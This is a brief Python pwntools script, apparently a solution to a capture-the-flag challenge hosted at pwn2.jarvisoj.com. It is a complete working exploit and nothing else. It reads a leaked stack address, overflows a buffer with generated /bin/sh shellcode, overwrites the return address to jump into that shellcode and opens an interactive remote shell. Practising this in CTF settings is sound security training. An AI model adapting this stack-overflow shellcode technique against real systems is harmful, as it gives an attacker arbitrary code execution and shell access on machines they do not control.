from pwn import *

r = remote('pwn2.jarvisoj.com',9877)

asmshellcode = asm(shellcraft.sh())


buf_addr =  int(r.recv()[12:].replace('?','').strip(),16)
payload = asmshellcode + 'a' * (0x88+4 - len(asmshellcode)) + p32(buf_addr)
#payload = asmshellcode + 'a' * 95 + p32(buf_addr)
r.sendline(payload)
#print len(buf_addr)
r.interactive() 
